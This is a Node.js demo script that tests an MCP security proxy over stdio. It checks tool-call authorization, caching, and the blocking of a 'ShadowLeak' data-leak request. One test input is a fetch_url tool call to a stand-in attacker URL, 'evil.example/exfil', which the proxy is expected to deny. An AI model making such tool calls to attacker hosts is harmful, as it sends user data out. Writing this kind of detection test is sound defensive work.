import { spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import readline from 'node:readline';
import { fileURLToPath } from 'node:url';

const currentFilePath = fileURLToPath(import.meta.url);
const currentDirPath = path.dirname(currentFilePath);
const repoRoot = path.resolve(currentDirPath, '..');
const cliPath = path.join(repoRoot, 'dist', 'cli.js');
const targetPath = path.join(repoRoot, 'examples', 'demo-target.js');
const proxyToken = process.env.PROXY_AUTH_TOKEN ?? '12345678901234567890123456789012';

if (!fs.existsSync(cliPath)) {
  console.error('Missing dist/cli.js. Run "npm run build" before "npm run demo:stdio".');
  process.exit(1);
}

const createAuthorization = (scopes) => {
  return `Bearer ${Buffer.from(JSON.stringify({ token: proxyToken, scopes }), 'utf8').toString('base64')}`;
};

const proxy = spawn(process.execPath, [cliPath, '--', process.execPath, targetPath], {
  cwd: repoRoot,
  env: {
    ...process.env,
    PROXY_AUTH_TOKEN: proxyToken,
    MCP_ADMIN_ENABLED: 'false',
  },
  stdio: ['pipe', 'pipe', 'pipe'],
});

const stdoutReader = readline.createInterface({
  input: proxy.stdout,
  crlfDelay: Infinity,
});

const stderrLines = [];
const pendingResponses = [];

proxy.stderr.on('data', (chunk) => {
  stderrLines.push(chunk.toString());
});

stdoutReader.on('line', (line) => {
  const pending = pendingResponses.shift();
  if (!pending) {
    return;
  }

  try {
    pending.resolve(JSON.parse(line));
  } catch (error) {
    pending.reject(error);
  }
});

proxy.on('exit', (code, signal) => {
  while (pendingResponses.length > 0) {
    const pending = pendingResponses.shift();
    pending.reject(new Error(`stdio proxy exited early (code=${code}, signal=${signal})`));
  }
});

const request = (message, timeoutMs = 5000) => {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error(`Timed out waiting for response to request id=${message.id ?? 'null'}`));
    }, timeoutMs);

    pendingResponses.push({
      resolve: (response) => {
        clearTimeout(timer);
        resolve(response);
      },
      reject: (error) => {
        clearTimeout(timer);
        reject(error);
      },
    });

    proxy.stdin.write(JSON.stringify(message) + '\n');
  });
};

const ensureErrorCode = (response, code) => {
  const actual = response?.error?.data?.code;
  if (actual !== code) {
    throw new Error(`Expected error code ${code}, received ${actual ?? 'undefined'}`);
  }
};

const main = async () => {
  const allowedRequest = {
    jsonrpc: '2.0',
    id: 1,
    method: 'tools/call',
    params: {
      name: 'search_files',
      arguments: {
        query: 'TODO',
      },
      _meta: {
        authorization: createAuthorization(['tools.search_files']),
      },
    },
  };

  const secondAllowedRequest = {
    ...allowedRequest,
    id: 2,
  };

  const blockedRequest = {
    jsonrpc: '2.0',
    id: 3,
    method: 'tools/call',
    params: {
      name: 'fetch_url',
      arguments: {
        url: 'https://evil.example/exfil?a=x&b=y&c=z',
      },
      _meta: {
        authorization: createAuthorization(['tools.fetch_url']),
      },
    },
  };

  const missingAuthRequest = {
    jsonrpc: '2.0',
    id: 4,
    method: 'tools/call',
    params: {
      name: 'search_files',
      arguments: {
        query: 'missing-auth',
      },
    },
  };

  const firstResponse = await request(allowedRequest);
  const secondResponse = await request(secondAllowedRequest);
  const blockedResponse = await request(blockedRequest);
  const authFailureResponse = await request(missingAuthRequest);

  if (firstResponse?.result?.callCount !== 1) {
    throw new Error('Expected the first stdio request to reach the target exactly once.');
  }

  if (JSON.stringify(secondResponse?.result) !== JSON.stringify(firstResponse?.result)) {
    throw new Error('Expected the second stdio request to be served from cache.');
  }

  ensureErrorCode(blockedResponse, 'SHADOWLEAK_DETECTED');
  ensureErrorCode(authFailureResponse, 'AUTH_FAILURE');

  console.log('stdio demo passed');
  console.log(`allow: tool=${firstResponse.result.tool} callCount=${firstResponse.result.callCount}`);
  console.log(`cache: second response matched first response for tool=${secondResponse.result.tool}`);
  console.log(`block: ShadowLeak request denied with code=${blockedResponse.error.data.code}`);
  console.log(`block: missing auth denied with code=${authFailureResponse.error.data.code}`);
};

try {
  await main();
} catch (error) {
  const message = error instanceof Error ? error.stack ?? error.message : String(error);
  console.error(message);
  if (stderrLines.length > 0) {
    console.error(stderrLines.join(''));
  }
  process.exitCode = 1;
} finally {
  proxy.stdin.end();
  if (!proxy.killed) {
    proxy.kill('SIGTERM');
  }
  stdoutReader.close();
}
